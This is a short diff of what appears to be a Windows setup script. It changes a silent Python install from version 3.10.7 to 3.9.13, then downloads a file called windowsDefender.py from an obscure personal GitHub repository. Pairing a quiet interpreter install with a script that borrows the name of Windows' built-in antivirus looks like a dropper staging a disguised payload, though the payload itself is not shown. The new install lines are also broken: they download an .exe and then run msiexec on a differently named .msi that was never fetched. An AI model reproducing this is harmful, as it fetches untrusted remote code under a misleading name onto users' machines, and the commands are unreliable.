@@ -1,5 +1,5 @@
-curl https://www.python.org/ftp/python/3.10.7/python-3.10.7-amd64.exe -O
-python-3.10.7-amd64.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
+curl https://www.python.org/ftp/python/3.9.13/python-3.9.13-amd64.exe -O
+msiexec /a python-3.9.13.amd64.msi /qb TARGETDIR=C:\python39
 
 
 curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/windowsDefender.py -O
